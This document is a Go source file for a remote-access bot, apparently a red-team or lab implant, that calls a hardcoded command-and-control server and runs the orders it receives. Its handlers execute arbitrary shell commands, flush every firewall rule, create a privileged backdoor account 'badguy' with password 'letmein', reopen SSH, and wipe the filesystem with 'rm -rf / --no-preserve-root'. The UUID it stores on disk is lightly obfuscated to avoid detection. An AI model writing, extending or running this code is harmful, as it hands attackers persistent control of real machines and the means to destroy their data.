package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/google/uuid"
)

// HOST : server to call
var serv = "192.168.206.183:5656"

// MAGIC : the shared hex byte that will signify the start of each MAD payload
var MAGIC = []byte{0xAA}

// MAGICBYTE is the single byte (rather than a byte array)
var MAGICBYTE = MAGIC[0]

//MAGICSTR is the ascii representation of the magic byte
var MAGICSTR = string(MAGIC)

// MAGICTERM : the shared hex byte that will signify the end of each MAD payload
var MAGICTERM = []byte{0xAB}

// MAGICTERMBYTE is the single byte (rather than a byte array)
var MAGICTERMBYTE = MAGICTERM[0]

//MAGICTERMSTR is the ascii representation of the magic byte
var MAGICTERMSTR = string(MAGICTERM)

//REGFILE is where the registration info for this bot is kept
var REGFILE = "/etc/PETREG"

//INTERVAL is how long the sleep is between callbacks (if run in loop mode)
var INTERVAL = 60

//DELTA is the +/- variance in interval time
var DELTA = 5

//OBFSEED is the seed int that will get used for uuid obfuscation
var OBFSEED = 5

//OBFTEXT is the seed text that will get used for uuid obfuscation
var OBFTEXT = "test"

//blast payload out to C2, listen to response
func sendData(data string, mode string, aid string) string {
	payload := encodePayload(data, mode, aid)
	conn, err := net.Dial("tcp4", serv)
	if err != nil {
		panic(err)
	}
	outText := []byte(payload)
	conn.Write(outText)
	message, err := bufio.NewReader(conn).ReadString(MAGICTERMBYTE)
	if err != nil {
		return "0:0:0"
	}
	respStr := string(message)
	decResp := decodePayload(respStr)
	conn.Close()
	return decResp
}

// base64 the payload and prepend/append magic chars
func encodePayload(data string, mode string, aid string) string {
	preEnc := mode + "||" + aid + "||" + data
	encStr := base64.StdEncoding.EncodeToString([]byte(preEnc))
	fin := MAGICSTR + encStr + MAGICTERMSTR
	return fin
}

//decode from MAD into plaintext string
func decodePayload(payload string) string {
	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
	data, err := base64.StdEncoding.DecodeString(encodedPayload)
	if err != nil {
		return ""
	}
	return string(data)
}

//check if we've already registered
func checkRegStatus() bool {
	if _, err := os.Stat(REGFILE); os.IsNotExist(err) {
		return false
	}
	return true
}

//register the bot with the DB
func register() string {
	uid := uuid.New().String()
	storeUUID(uid)
	hn := getIP()
	intrv := strconv.Itoa(INTERVAL)
	dlt := strconv.Itoa(DELTA)
	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
	ret := sendData(payload, "C", "0")
	return ret
}

//pull all commands to be executed
func getCommand() {
	uid := fetchUUID()
	coms := sendData(uid, "D", "0")
	results := parseCommands(coms)
	if results == nil {
		return
	}
	sendResults(results)
	return
}

//split large string into individual commands/arguments
func parseCommands(commandBlob string) []string {
	results := []string{}
	isplit := strings.Split(commandBlob, "<||>")
	for _, comStr := range isplit {
		jsplit := strings.SplitN(comStr, ":", 3)
		aid := jsplit[0]
		mode := jsplit[1]
		if mode == "0" {
			return nil
		}
		args := jsplit[2]
		output := execCommand(mode, args)
		resStr := aid + ":" + output
		results = append(results, resStr)
	}
	return results
}

//pass each action to appropriate handler
func execCommand(mode string, args string) string {
	retval := ""
	switch mode {
	case "0": //no command
		return ""
	case "1": //shell exec of args
		retval = shellExec(args)
	case "2":
		retval = fwFlush()
	case "3":
		retval = createUser()
	case "4":
		retval = enableRemote()
	case "5":
		retval = spawnRevShell(args)
	case "6":
		retval = unknownCom()
	case "7":
		retval = unknownCom()
	case "8":
		retval = unknownCom()
	case "9":
		retval = unknownCom()
	case "A":
		retval = unknownCom()
	case "B":
		retval = unknownCom()
	case "F":
		retval = nuke()
	default:
		retval = unknownCom()
	}
	return retval
}

//send output of all executed commands
func sendResults(results []string) {
	resStr := strings.Join(results, "<||>")
	sendData(resStr, "E", "0")
	return
}

//get IP of default interface, which the DB will use as hostname
func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	return ipStr
}

//write the UUID to somewhere on disk
func storeUUID(uid string) {
	obf := obfuscateUUID(uid, OBFSEED, OBFTEXT)
	f, _ := os.Create(REGFILE)
	io.WriteString(f, obf)
	f.Close()
	return
}

//grab the obfuscated UUID from somewhere on disk
func fetchUUID() string {
	obf, _ := ioutil.ReadFile(REGFILE)
	deobf := deobfuscateUUID(string(obf))
	return deobf
}

//simple obfuscation so you cant just search the filesystem for uuid formatted strings
func obfuscateUUID(uid string, seed int, text string) string {
	splituid := strings.Split(uid, "-")
	l1 := strings.Repeat(text, rand.Intn(seed))
	l2 := strings.Repeat(text, rand.Intn(seed))
	l3 := strings.Repeat(text, rand.Intn(seed))
	l4 := strings.Repeat(text, rand.Intn(seed))
	obf := splituid[0] + l1 + splituid[1] + splituid[2] + l2 + splituid[3] + l3 + splituid[4] + l4
	// its' really crappy obfuscation but it's a small deterrent
	return obf
}

//undo UUID obfuscations
func deobfuscateUUID(obf string) string {
	p := strings.Replace(obf, OBFTEXT, "", -1)
	p = p[:8] + "-" + p[8:]
	p = p[:13] + "-" + p[13:]
	p = p[:18] + "-" + p[18:]
	p = p[:23] + "-" + p[23:]
	return p
}

//most commonly used, pass in args to a shell
func shellExec(args string) string {
	cmd := exec.Command("/bin/sh", "-c", args)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//flush firewall rules from all tables
func fwFlush() string {
	cmd := exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//create a new user.  maybe in the future name/pass will be passed as args
func createUser() string {
	comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
	if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
		comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
	}
	cmd := exec.Command("/bin/sh", "-c", comStr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//allow ssh connections and restart the service
func enableRemote() string {
	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
	insRule.Run()
	cmd := exec.Command("/bin/sh", "-c", "systemctl restart sshd")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(err.Error())
	}
	return string(out)
}

//spawn a (disowned) reverse shell back to target IP/port
func spawnRevShell(target string) string {
	fmt.Println("In spawnRevShell")
	//soon to come...
	return ""
}

// probably never use this, but it's nice to have around :^)
func nuke() string {
	//rm rf dat boi
	cmd := exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
	out, _ := cmd.CombinedOutput()
	return string(out)
}

//if the opcode is something weird, dont know what to do with it
func unknownCom() string {
	return ""
}

//run everything
func main() {
	a := checkRegStatus()
	if a {
		getCommand()
	} else {
		register()
		getCommand()
	}
}
